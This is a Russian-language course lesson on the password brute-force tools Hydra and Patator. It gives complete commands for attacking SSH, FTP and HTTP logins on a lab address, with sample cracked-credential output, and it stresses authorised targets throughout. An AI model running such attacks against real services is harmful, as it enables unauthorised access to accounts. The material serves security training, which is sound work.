# Урок 36: Hydra и Patator — брутфорс паролей

## Учебная рамка

**Входные требования:** Умение работать в терминале, понимать IP/порт, scope и базовые юридические ограничения.

**Результат занятия:** Студент запускает инструмент только по разрешенной цели, читает ключевые строки вывода и оформляет результат как находку или наблюдение.

**Безопасная цель:** Только `192.168.100.20`, `target.local`, Metasploitable/VulnHub/THM/HTB/PortSwigger в рамках их правил. Не использовать домашний роутер как цель атаки.

**Среда выполнения:** Основной путь — macOS native, браузер, DevTools, Homebrew и Python. Kali Linux ARM64 VM, UTM или cloud lab используются только если это явно требуется задачей или вынесено в углубление.

**Обязательный путь новичка:** Запустить безопасный минимальный режим инструмента, сохранить команду и объяснить 2-3 ключевых параметра.

**Углубление:** Сравнить два режима инструмента, добавить ограничение скорости/потоков и оформить краткий риск-анализ.

**Минимальная проверка успеха:** Команда выполнена по учебной цели, вывод сохранен, студент отличает обнаружение от подтвержденной уязвимости.

**Эталонный вывод:** В отчете есть target, команда, сокращенный вывод, интерпретация и пометка `разрешенная учебная цель`.

**Критерии сдачи:** Зачет: корректный запуск и интерпретация. Отлично: добавлены ограничения безопасности, rate limit или проверка false positive.

## Теория

**Hydra** (THC Hydra) — классический инструмент для брутфорса паролей по сетевым протоколам. Поддерживает множество сервисов: SSH, FTP, HTTP, SMB, VNC, RDP и др.

**Patator** — более современный инструмент, написанный на Python. Меньше шумит, лучше обрабатывает ошибки, поддерживает многопоточность.

ВАЖНО: Используйте только на легальных целях (свои лаборатории, с разрешения владельца). Несанкционированный брутфорс — преступление.

## Практическое занятие

### Hydra

```bash
# Установка
sudo apt install hydra

# macOS (M2, Homebrew)
brew install hydra

# Проверка сервисов
hydra -U
# Пример вывода:
# Available services: asterisk cisco cisco-enable cvs firebird ftp ftps http http-form-get http-form-post http-get http-head https https-form-get https-form-post icq imap imaps irc ldap2 ldap3 ldaps mssql mysql nntp oracle oracle-listener pcanywhere pcnfs pop3 pop3s postgres rdp redis rexec rlogin rsh s7-300 sip smb smtp smtp-enum snmp socks5 ssh sshkey svn teamspot telnet vmauthd vnc xmpp

# Брутфорс SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.20
# Пример вывода:
# [DATA] attacking ssh://192.168.100.20:22/
# [22][ssh] host: 192.168.100.20   login: admin   password: password123

hydra -L users.txt -P passwords.txt ssh://192.168.100.20

# Брутфорс FTP
hydra -l admin -P wordlist.txt ftp://192.168.100.20

# Брутфорс HTTP Form (POST)
hydra -l admin -P wordlist.txt 192.168.100.20 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# Брутфорс HTTP Basic Auth
hydra -l admin -P wordlist.txt 192.168.100.20 http-get /admin/

# Настройка количества потоков
hydra -t 4 -l admin -P wordlist.txt ssh://192.168.100.20
```

### Параметры Hydra
```
-l — один логин
-L — файл со списком логинов
-p — один пароль
-P — файл с паролями
-t — количество потоков
-s — конкретный порт
-v — подробный вывод
-V — вывод каждой попытки
-f — остановиться при первом успехе
```

### Patator

```bash
# Установка
git clone https://github.com/lanjelot/patator.git
cd patator

# Брутфорс SSH
python3 patator.py ssh_login host=192.168.100.20 user=admin password=FILE0 0=/usr/share/wordlists/rockyou.txt
# Пример вывода:
# 192.168.100.20:22 ssh_login: 'admin' 'password123' 0

# Брутфорс FTP
python3 patator.py ftp_login host=192.168.100.20 user=admin password=FILE0 0=wordlist.txt

# Брутфорс HTTP
python3 patator.py http_fuzz url=http://192.168.100.20/admin.php method=POST body='user=admin&pass=FILE0' 0=wordlist.txt

# Настройка задержки (не спамить)
python3 patator.py ssh_login host=192.168.100.20 user=admin password=FILE0 0=wordlist.txt -x ignore:mesh='incorrect' delay=2
```


## Примеры вывода

Минимальный эталонный вывод для сдачи:

```text
$ <команда из практики>
<3-10 строк фактического вывода из разрешенной среды>
```

В отчете студент указывает среду выполнения, безопасную цель, команду или ручные шаги и коротко объясняет, какая строка подтверждает результат.



## Адаптация под macOS (M2, 8GB)

- Для macOS native используйте Homebrew или официальный installer: `brew install <tool>`; для явно помеченной Kali/Linux-среды допустим `apt`.
- Kali/Linux VM запускайте только как углубление и выделяйте не более 3-4GB RAM на MacBook Air M2 (8GB)
- Если нужна Kali/Linux VM на Apple Silicon, используйте ARM64-образ в UTM/VMware Fusion/Parallels; не используйте x86/x64 VM как базовый путь.
- Docker работает нативно на M2: `docker pull <image>`
- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты
- Для Python используйте `pip3 install` вместо `pip install`


## Задачи для самостоятельного выполнения

1. **Минимум:** не запускайте brute force. Разберите синтаксис Hydra на учебной команде и подпишите, где задаются логин, словарь, протокол, цель и ограничение потоков.

2. **Лаборатория:** в TryHackMe/HTB/локальной ARM64 VM с явно разрешенной целью выполните не более 10 попыток с учебным словарем и `-t 1`. Зафиксируйте rate limit и stop conditions.

3. Сравните Hydra и Patator на одной и той же лабораторной задаче без увеличения числа попыток. Какой инструмент удобнее и почему?

4. Используйте маленький словарь (до 10 паролей) только в своей лаборатории. Какой флаг показывает каждую попытку и почему его нельзя включать на реальном стенде без согласования?

5. Напишите безопасный wrapper-скрипт, который отказывается запускать Hydra, если цель не входит в allowlist лабораторных адресов.

## Частые ошибки

1. **Неправильный формат строки для HTTP форм в Hydra** — правильный синтаксис: `http-post-form "/path:params:F=fail_string"` или `:S=success_string`.

2. **Слишком много потоков (-t)** — большое количество потоков может привести к блокировке IP или зависанию сервиса.

3. **Отсутствие прав root для некоторых проверок** — Hydra не требует root, но некоторые сетевые настройки могут влиять.

4. **Игнорирование задержки (delay) в Patator** — без задержки можно быстро забрутфорсить сервис или получить бан.

## Вопросы на понимание

1. В чем разница между флагами `-l` и `-L` в Hydra?

2. Как определить строку успеха (success) и неудачи (fail) при брутфорсе HTTP форм?

3. Почему Patator считается более "тихим" инструментом, чем Hydra?

4. Что делает флаг `-f` в Hydra и когда его стоит использовать?

## Практика на Slider AI

**Цель стенда:** `https://olddev.slider-ai.ru`

**Контекст разрешения:** тестовый стенд проекта Slider AI, доступен QA для обучения и проверки безопасности. Production и любые другие домены не входят в это задание.

**Ограничения безопасности:** соблюдать `education/slider_ai_scope.md`; не выполнять DoS/load-тесты, brute force, destructive payloads, изменение чужих данных, извлечение секретов и действия вне согласованного scope.

**Уровень прогрессии:** Password attack awareness

### Минимум

Не выполнять и не запускать Hydra/Patator по Slider AI; составьте checklist защиты от brute force.

### Практика Slider AI

Проверьте вручную только наличие CAPTCHA/rate-limit/lockout-индикаторов без серии попыток.

### Углубление после изучения следующих уроков

После отдельного письменного разрешения подготовьте план rate-limit test с лимитами и stop conditions.

### Артефакт сдачи

Markdown-запись по шаблону из `education/slider_ai_scope.md`: урок, компонент Slider AI, шаги, фактический результат, доказательства без секретов, риск, рекомендация и статус.

### Критерий готовности

Задание выполнено только на `olddev.slider-ai.ru`, не выходит за scope, содержит проверяемый артефакт и явно отмечает `finding`, `informational`, `not reproducible`, `not applicable` или `requires approval`.
